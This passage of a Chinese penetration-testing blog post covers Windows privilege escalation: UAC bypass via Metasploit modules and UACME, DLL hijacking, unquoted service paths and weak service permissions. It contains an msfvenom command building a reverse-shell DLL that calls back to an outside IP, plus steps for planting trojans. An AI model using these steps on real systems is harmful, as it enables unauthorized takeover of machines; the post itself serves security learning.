+<h2 id="0x05：Bypass-UAC"><a href="#0x05：Bypass-UAC" class="headerlink" title="0x05：Bypass UAC"></a>0x05：Bypass UAC</h2><p>UAC(User Account Control，用户账号控制) 是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。</p>
+<h4 id="octopus-MSF"><a href="#octopus-MSF" class="headerlink" title=":octopus:MSF"></a>:octopus:MSF</h4><p>确认getsystem无法提权</p>
+<p><img src="/../../imgs/image-20240106181529660.png" alt="image-20240106181529660"></p>
+<p>搜索uac</p>
+<p><img src="/../../imgs/image-20240106181629127.png" alt="image-20240106181629127"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Test in Win7 本地电脑 本地权限</span><br><span class="line">	use exploit/windows/local/bypassuac</span><br><span class="line">-Test in Win10 本地电脑 本地权限</span><br><span class="line">    use exploit/windows/local/ask（这个很弱智，要对方点击确认）</span><br><span class="line">    use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">    use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="octopus-UACME项目"><a href="#octopus-UACME项目" class="headerlink" title=":octopus:UACME项目"></a>:octopus:UACME项目</h4><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">项目地址–内含七十多中uacbypass姿势</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Akagi64.exe [bypassuac的姿势序号名]  [要打开的程序]</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Akagi64.exe 41 msf1.exe</span><br><span class="line">（这个项目比较好用的模块有 23、61、41，实测61可以搞win11提升system权限）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20240106152150255.png" alt="image-20240106152150255"></p>
+<p><img src="/../../imgs/image-20240106152203391.png" alt="image-20240106152203391"></p>
+<h2 id="0x06：DLL劫持"><a href="#0x06：DLL劫持" class="headerlink" title="0x06：DLL劫持"></a>0x06：DLL劫持</h2><p><img src="/../../imgs/image-20240106182907920.png" alt="image-20240106182907920"></p>
+<p>动态链接库DLL在Windows中很多应用程序不是一个完整的执行程序，他们被分为一些相对独立的动态链接库，放置系统中。当执行某一个程序的时候相应的DLL就会被调用，当然一个DLL也可以被多个程序调用。详细原理：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225911#h2-0">DLL劫持原理及其漏洞挖掘</a></p>
+<p>原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、应用程序加载的目录</span><br><span class="line">2、C:\Windows\System32</span><br><span class="line">3、C:\Windows\System</span><br><span class="line">4、C:\Windows</span><br><span class="line">5、当前工作目录Current Working Directory，CWD</span><br><span class="line">6、在PATH环境变量的目录（先系统后用户）</span><br></pre></td></tr></table></figure>
+
+<p>注意：一般DLL劫持的是当前工作目录的dll文件</p>
+<p>过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功</p>
+<h4 id="octopus-工具"><a href="#octopus-工具" class="headerlink" title=":octopus:工具"></a>:octopus:工具</h4><ul>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://github.com/anhkgg/anhkgg-tools">ChkDllHijack</a></li>
+<li>:panda_face:火绒剑</li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler">rattler</a></li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-utilities">Process Monitor</a></li>
+</ul>
+<blockquote>
+<p>（火绒剑用于分析程序运行会调用哪些dll文件，ChkDllHijack用于检测某个dll文件是否可以劫持，但实际我测试没有卵用，直接劫持替换就行了）</p>
+</blockquote>
+<h4 id="octopus-MSF-1"><a href="#octopus-MSF-1" class="headerlink" title=":octopus:MSF"></a>:octopus:MSF</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117  lport=4444 -f dll -o ftp.dll</span><br><span class="line">提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07：不带引号服务路径配合MSF"><a href="#0x07：不带引号服务路径配合MSF" class="headerlink" title="0x07：不带引号服务路径配合MSF"></a>0x07：不带引号服务路径配合MSF</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如 C:\Program Files (x86)\Acunetix\wvs_supervisor.exe 这个服务（以Admin身份运行），</span><br><span class="line">若存在 C:\Program.exe ，那服务启动时会识别成 &quot;文件+参数&quot; 的形式，</span><br><span class="line">所以将生成的木马放到 C:\Program.exe 下，那么服务启动时，木马 C:\Program.exe 也会以Admin身份运行</span><br></pre></td></tr></table></figure>
+
+<p>过程：检测可利用的不带引号服务路径 - 上传反弹exe并设置好对应执行名 - 启动对应服务</p>
+<p>方法1、检测脚本：<a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">JAWS </a>（直接powershell执行 .&#x2F;jaws-enum.ps1就可以检测出来）</p>
+<p>方法2、检测命令cmd执行：搜索那些服务没有包含引号</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（最后启动服务：sc start &quot;</span>服务名<span class="string">&quot;）</span></span><br></pre></td></tr></table></figure>
+
+<p>实测：JAWS可能跑不出来，方法2的命令可以，但需要一定权限。</p>
+<h2 id="0x08：不安全的服务权限"><a href="#0x08：不安全的服务权限" class="headerlink" title="0x08：不安全的服务权限"></a>0x08：不安全的服务权限</h2><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，</p>
+<p>例如，可以直接修改服务binPath所指向的执行文件。</p>
+<p>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p>
+<h4 id="octopus-检测脚本"><a href="#octopus-检测脚本" class="headerlink" title=":octopus:检测脚本"></a>:octopus:检测脚本</h4><ul>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerUp(PowerSploit)</a></li>
+<li>:panda_face: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">-用 accesschk.exe 工具查看当前用户可修改的服务</a></li>
+</ul>
+<h2 id="0x09：参考资料"><a href="#0x09：参考资料" class="headerlink" title="0x09：参考资料"></a>0x09：参考资料</h2><ul>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54430466/article/details/121678118">MSF漏洞利用完成但无法创建会话的几种原因</a></li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61553520/article/details/130926560">提权神器：WindowsVulnScan</a></li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/R0ser1/p/16060625.html">Windows权限提升</a></li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/14264191.html">Windows权限提升的几个姿势</a></li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12365">DLL劫持入门</a></li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225911#h2-0">DLL劫持原理及其漏洞挖掘（一）</a></li>
+<li>:panda_face:<a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powerup.html">Powrshell 提权框架-Powerup</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author_group"><a class="post-copyright__author_img" href="/about/"><img class="post-copyright__author_img_front" src="https://bu.dusays.com/2023/11/08/654af68b25bb8.jpg"></a><div class="post-copyright__author_name">秋刀鱼</div><div class="post-copyright__author_desc">生活明朗,万物可爱</div></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div id="quit-box" onclick="RemoveRewardMask()"></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本文是原创文章，采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>协议，完整转载请注明来自<a href="/">秋刀鱼</a></span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><span class="tags-punctuation"></span>权限提升<span class="tagsPageCount">4</span></a></div></div></div><nav class="needEndHide pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/28/Web%E6%BC%8F%E6%B4%9E/WAF%E6%94%BB%E9%98%B2/"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">WAF攻防</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/linux%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF/"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux提权姿势</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="scoicon sco-star-smile-fill"></i><span>喜欢这篇的人也看了</span><div class="relatedPosts-link"><a onclick="event.preventDefault(); toRandomPost();" href="javascript:void(0);" rel="external nofollow" data-pjax-state="">随便逛逛</a></div></div><div class="relatedPosts-list"><div><a href="/2023/11/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/linux%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF/" title="Linux提权姿势"><img class="cover" src="https://images3.alphacoders.com/133/1330314.png" alt="cover"><div class="content is-center"><div class="title">Linux提权姿势</div></div></a></div><div><a href="/2023/11/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/MYSQL%E6%8F%90%E6%9D%83/" title="MySQL提权"><img class="cover" src="https://w.wallhaven.cc/full/zy/wallhaven-zy2x7v.png" alt="cover"><div class="content is-center"><div class="title">MySQL提权</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><div class="author-info__top-group"><div class="author-info__sayhi" id="author-info__sayhi" onclick="sco.changeSayHelloText()">sayhello.morning</div></div></div><div class="avatar-img-group"><img class="avatar-img" alt="头像" src="https://pic.imgdb.cn/item/65ae347f871b83018af6c612.jpg"><div class="avatar-sticker"><img class="avatar-sticker-img" src="https://bu.dusays.com/2023/12/30/659011053e246.png" alt="心情贴纸"></div></div><div class="author-info__description_group"><div class="author-info__description">分享自己对编程的<b>热爱</b>，对美好生活的<b>向往</b>，对知识海洋<b>探索历程</b>。</div><div class="author-info__description2">相信你可以在这里找到对你有用的知识和教程。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about/"><div class="author-info__name">Vocal</div><div class="author-info__desc">生活明朗,万物可爱</div></a><div class="card-info-social-icons is-center"><a class="social-icon" target="_blank" rel="noopener" href="https://github.com/hxysaury" title="Github"><i class="scoicon  sco-github-line"></i></a><a class="social-icon" target="_blank" rel="noopener" href="https://space.bilibili.com" title="Bilibili"><i class="scoicon  sco-bilibili-line"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="scoicon sco-menu-line"></i><span>文章目录</span></div><div class="toc-content" id="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9A%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">0x00：前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9A%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA"><span class="toc-text">0x01：内核溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-%E9%A1%B9%E7%9B%AE%E5%B7%A5%E5%85%B7"><span class="toc-text">:octopus:项目工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-%E6%89%8B%E5%8A%A8%E6%90%9C%E7%B4%A2EXP"><span class="toc-text">:octopus:手动搜索EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-%E7%BA%AF%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-text">:octopus:纯手工提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-CS%E9%85%8D%E5%90%88%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-text">:octopus:CS配合插件进行提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-MSF-local-exploit-suggester-%E6%A8%A1%E5%9D%97"><span class="toc-text">:octopus:MSF  local_exploit_suggester 模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-MSF-enum-patches%E6%A8%A1%E5%9D%97"><span class="toc-text">:octopus:MSF  enum_patches模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9AAT-SC-PS%E5%91%BD%E4%BB%A4"><span class="toc-text">0x02：AT&amp;SC&amp;PS命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9A%E8%BF%9B%E8%A1%8C%E8%BF%81%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="toc-text">0x03：进行迁移注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-pinjector"><span class="toc-text">:octopus:pinjector</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-MSF%E6%B3%A8%E5%85%A5"><span class="toc-text">:octopus:MSF注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%EF%BC%9A%E4%BB%A4%E7%89%8C%E8%8E%B7%E5%8F%96"><span class="toc-text">0x04：令牌获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-MSF%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-text">:octopus:MSF令牌窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-text">:octopus:烂土豆提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%EF%BC%9ABypass-UAC"><span class="toc-text">0x05：Bypass UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-MSF"><span class="toc-text">:octopus:MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-UACME%E9%A1%B9%E7%9B%AE"><span class="toc-text">:octopus:UACME项目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%EF%BC%9ADLL%E5%8A%AB%E6%8C%81"><span class="toc-text">0x06：DLL劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-%E5%B7%A5%E5%85%B7"><span class="toc-text">:octopus:工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-MSF-1"><span class="toc-text">:octopus:MSF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07%EF%BC%9A%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88MSF"><span class="toc-text">0x07：不带引号服务路径配合MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08%EF%BC%9A%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-text">0x08：不安全的服务权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#octopus-%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC"><span class="toc-text">:octopus:检测脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09%EF%BC%9A%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">0x09：参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="scoicon sco-map-line"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/04/study-road/JAVA%E5%AE%89%E5%85%A8&amp;%E4%BA%91%E5%AE%89%E5%85%A8&amp;%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="JAVA安全&amp;云安全&amp;内网安全"><img alt="JAVA安全&amp;云安全&amp;内网安全" src="https://pic.imgdb.cn/item/65ebfc499f345e8d03a57b7d.png"></a><div class="content"><a class="title" href="/2024/03/04/study-road/JAVA%E5%AE%89%E5%85%A8&amp;%E4%BA%91%E5%AE%89%E5%85%A8&amp;%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="JAVA安全&amp;云安全&amp;内网安全">JAVA安全&amp;云安全&amp;内网安全</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/04/study-road/%E8%93%9D%E9%98%9F%EF%BC%88%E5%BA%94%E6%80%A5%E3%80%81%E5%8F%96%E8%AF%81%E7%AD%89%EF%BC%89/" title="蓝队（应急、取证等）"><img alt="蓝队（应急、取证等）" src="https://pic.imgdb.cn/item/65ebfc499f345e8d03a57b7d.png"></a><div class="content"><a class="title" href="/2024/03/04/study-road/%E8%93%9D%E9%98%9F%EF%BC%88%E5%BA%94%E6%80%A5%E3%80%81%E5%8F%96%E8%AF%81%E7%AD%89%EF%BC%89/" title="蓝队（应急、取证等）">蓝队（应急、取证等）</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/03/Android/%E5%88%9D%E8%AF%86smali/" title="初识smali"><img alt="初识smali" src="https://pic.imgdb.cn/item/65eb11b69f345e8d039d0162.png"></a><div class="content"><a class="title" href="/2024/03/03/Android/%E5%88%9D%E8%AF%86smali/" title="初识smali">初识smali</a><a class="article-recent_post_categories" href="/2024/03/03/Android/%E5%88%9D%E8%AF%86smali/">Andriod逆向</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/02/Android/APK%E7%BB%93%E6%9E%84/" title="APK结构&amp;双开&amp;汉化&amp;图标修改"><img alt="APK结构&amp;双开&amp;汉化&amp;图标修改" src="https://pic.imgdb.cn/item/65eaf60e9f345e8d033954f1.png"></a><div class="content"><a class="title" href="/2024/03/02/Android/APK%E7%BB%93%E6%9E%84/" title="APK结构&amp;双开&amp;汉化&amp;图标修改">APK结构&amp;双开&amp;汉化&amp;图标修改</a><a class="article-recent_post_categories" href="/2024/03/02/Android/APK%E7%BB%93%E6%9E%84/">Andriod逆向</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/02/CMD/%E6%9F%A5%E7%9C%8B%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84%E6%97%A0%E7%BA%BF/" title="查看电脑连接过的WIFI"><img alt="查看电脑连接过的WIFI" src="false/../../imgs/image-20240309220356881.png"></a><div class="content"><a class="title" href="/2024/03/02/CMD/%E6%9F%A5%E7%9C%8B%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84%E6%97%A0%E7%BA%BF/" title="查看电脑连接过的WIFI">查看电脑连接过的WIFI</a></div></div></div></div></div></div></main><footer id="footer"><div id="sco-footer-bar"><div class="footer-logo"><span class="scoicon">Solitude</span></div><div class="footer-bar-description">来自秋刀鱼 - 生活明朗,万物可爱的文章</div><a class="footer-bar-link" href="/">了解更多</a></div><div id="footer_deal"><div class="footer_mini_logo" id="footer_mini_logo" title="返回顶部" onclick="sco.toTop()"><img src="https://bu.dusays.com/2023/11/08/654af68b25bb8.jpg" alt="返回顶部"></div></div><div id="sco-footer"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div class="copyright">© 2022 - 2024 By&nbsp;<a class="footer-bar-link" href="/">Vocal</a></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/wleelw/hexo-theme-solitude" title="主题">主题</a><a class="footer-bar-link cc"><i class="scoicon sco-copyright-line"></i><i class="scoicon sco-creative-commons-by-line"></i><i class="scoicon sco-creative-commons-nc-line"></i><i class="scoicon sco-creative-commons-nd-line"></i></a></div></div></div></footer></div><!-- inject body--><div><script src="/js/main.js?v=1.5.1"></script><script src="/js/utils.js?v=1.5.1"></script><script src="https://cdn.cbd.int/solitude-source/js/universe.min.js"></script><script>dark()
+</script><script src="https://cdn.staticfile.org/pjax/0.2.8/pjax.min.js"></script><script src="https://cdn.staticfile.org/node-snackbar/0.1.16/snackbar.min.js"></script><script src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.staticfile.org/meting/2.0.1/Meting.min.js"></script><script>const meting_api = 'https://meting.qjqq.cn/?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+</script><script src="/js/music.js?v=1.5.1"></script><script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script><script src="https://cdn.staticfile.org/lunr.js/2.3.9/lunr.min.js"></script></div><div id="js-pjax"><script async src="https://cdn.staticfile.org/busuanzi/2.3.0/bsz.pure.mini.min.js"></script><script id="config-diff">var PAGE_CONFIG = {
+    is_post: true,
+    is_page: false,
+    is_home: false,
+    page: 'post',
+    toc: true,
+    comment: false,
+}
+</script></div><!-- newest comment--><!-- pjax--><script>let pjaxSelectors = [
+    'title',
+    '#body-wrap',
+    '#site-config',
+    'meta[name="description"]',
+    '#js-pjax',
+    'meta[property^="og:"]',
+]
+
+const pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+})
+
+document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+})
+
+document.addEventListener('pjax:complete', () => {
+    window.refreshFn()
+})
+
+document.addEventListener('pjax:error', (e) => {
+    if (e.request.status === 404) {
+        pjax.loadUrl('/404.html')
+    }
+})</script><!-- theme--><script>initTheme = () => {
+    const cachedMode = saveToLocal.get('theme');
+    if (cachedMode === undefined)
+        document.documentElement.setAttribute('data-theme', 'light');
+    else
+        document.documentElement.setAttribute('data-theme', cachedMode);
+}
+initTheme()</script><!-- search--><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="scoicon sco-close-fill"></i></button></nav><div class="search-wrap"><div class="search-box"><input class="search-box-input" id="search-input" type="text" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off" placeholder="输入关键词快速查找"></div><div id="search-results"><div id="search-hits"></div></div><div id="search-pagination"></div><div id="search-tips"></div></div></div><div id="search-mask"></div></div><script src="/js/search/local.js?v=1.5.1"></script><!-- music--><div class="needEndHide" id="nav-music" onclick="sco.musicToggle()"><div id="nav-music-hoverTips">音乐已暂停</div><meting-js id="8407304077" server="netease" type="playlist" mutex="true" preload="none" data-lrctype="0" order="random" theme="var(--sco-main)"></meting-js></div></body></html><script>const posts=["2024/03/04/study-road/JAVA安全&云安全&内网安全/","2024/03/04/study-road/蓝队（应急、取证等）/","2024/03/03/Android/初识smali/","2024/03/02/Android/APK结构/","2024/03/02/CMD/查看电脑连接过的无线/","2024/03/02/record/解决百度网盘下载慢问题/","2024/03/01/Android/环境搭建/","2024/03/01/Blue-Team/web1/","2024/03/01/Blue-Team/web2/","2024/02/26/record/README/","2024/02/24/安全工具/Nmap/","2024/02/24/安全工具/sqlmap/","2024/02/23/安全工具/hydra/","2024/02/23/安全工具/john&zip2john/","2024/02/23/安全工具/lbd负载均衡/","2024/02/23/安全工具/kali-wordlists/","2024/02/23/安全工具/msf生成木马/","2024/02/23/安全工具/nc/","2024/02/22/安全工具/nikto/","2024/02/20/record/tmux/","2024/02/18/内网安全/域控-防火墙-组策略不出网上线/","2024/02/14/record/涩涩情侣飞行棋密码破解/","2024/01/29/Blue-Team/日志自动提取分析项目_ELK_Logkit_LogonTracer_Anolog/","2024/01/11/渗透测试/CS架构客户端信息收集与流量分析/","2024/01/10/渗透测试/CS架构客户端环境搭建/","2024/01/08/内网安全/reGeorg流量转发/","2024/01/06/内网安全/frp穿透实验/","2024/01/03/内网安全/黄金票据与白银票据/","2024/01/02/内网安全/哈希传递/","2024/01/02/内网安全/域环境&域信息收集/","2024/01/01/内网安全/CS鱼饵制作/","2024/01/01/安全工具/Cobalt Strike/","2023/12/10/漏洞复现/Spring Boot Actuator未授权访问漏洞/","2023/11/30/Web漏洞/API攻防/","2023/11/30/Web漏洞/CRLF/","2023/11/30/Web漏洞/CSRF跨站请求伪造/","2023/11/30/Web漏洞/JWT安全/","2023/11/30/Web漏洞/SSRF服务端请求伪造/","2023/11/30/Web漏洞/URL重定向跳转/","2023/11/30/Web漏洞/WEB拒绝服务/","2023/11/30/Web漏洞/XSS跨站/","2023/11/30/Web漏洞/业务逻辑/","2023/11/30/Web漏洞/任意文件包含/","2023/11/30/Web漏洞/其他SQL注入/","2023/11/30/Web漏洞/子域名接管&COSP跨域资源&JSONP跨域回调/","2023/11/30/Web漏洞/弱口令/","2023/11/30/渗透测试/信息收集/","2023/11/30/漏洞复现/MySQL注入漏洞/","2023/11/28/Web漏洞/WAF攻防/","2023/11/24/渗透测试/Windows提权姿势/","2023/11/22/渗透测试/linux提权姿势/","2023/11/22/渗透测试/MYSQL提权/","2023/11/20/Web漏洞/RCE/","2023/11/20/Web漏洞/任意文件上传/","2023/11/20/渗透测试/phpMyAdmin利用/","2023/11/19/漏洞复现/phpstudy2016-2018命令执行漏洞复现/","2023/11/16/漏洞复现/Fastjson_1.2.47_rce/","2023/11/16/漏洞复现/fastjson_1.2.24_unserializer_rce/","2023/11/13/漏洞复现/Zookeeper未授权/","2023/11/11/漏洞复现/MongoDB未授权/","2023/11/11/漏洞复现/Redis未授权/","2023/11/09/漏洞复现/Elasticsearch 未授权访问/","2023/11/09/漏洞复现/IIS_7.o7.5解析漏洞/","2023/11/09/漏洞复现/Memcached 未授权访问/","2023/05/19/Python/Python-BBS项目开发/","2023/05/16/Django/Python-Django-图片验证码，发送邮箱，富文本编辑器/","2023/05/14/Django/Python-DJango-Cookie与Session/","2023/05/14/Django/Python-froms组件/","2023/05/14/Python/Python-自定义分页器/","2023/05/13/Django/Django自带的序列化组件/","2023/05/13/Django/Python-Django-批量插入 bulk_create/","2023/05/13/Django/Python-Djangochoices参数/","2023/05/12/Django/Python-Django基于jQuery的Ajax实现/","2023/05/12/Django/Python-Django中间件/","2023/05/12/Django/Python-Django模型层/","2023/05/12/Django/Python-Django模版层/","2023/05/12/Django/Python-Django视图层/","2023/05/12/Django/Python-csrf跨站请求伪造/","2023/05/12/Django/Python-基于Django中间件引发的编程思想/","2023/05/12/Python/Python-auth模块/","2023/05/11/Django/Python-Django路由层/","2023/05/10/Django/Python-Django请求周期流程图（重要）/","2023/05/09/Django/Python-Django ORM/","2023/05/06/Django/Python-Django基本操作/","2023/05/06/Django/Python-Django链接MySQL/","2023/05/06/Django/python-Django小白必会三板斧/","2023/05/06/Django/python-Django静态文件配置/","2023/05/06/Python/Python-pycharm链接数据库（MySQL）/","2023/05/05/Django/Python-Django引入/","2023/04/18/Python/Python爬虫/","2023/04/11/Python/Python-并发编程/","2023/04/11/Python/Python正则/","2023/04/10/Python/Python-网络编程/","2023/04/10/Python/Python文件操作/","2023/04/09/Python/Python-办公自动化/","2023/04/09/Python/Python面向对象/","2023/04/07/Python/Python函数/","2023/04/07/Python/Python模块与包/","2023/04/06/Python/Python数据类型/","2023/04/05/Python/Python流程控制/","2023/04/04/Python/Python初识/","2023/04/02/Python/Python-打包exe执行文件/"];function toRandomPost(){ pjax.loadUrl('/'+posts[Math.floor(Math.random()*posts.length)]); };</script>
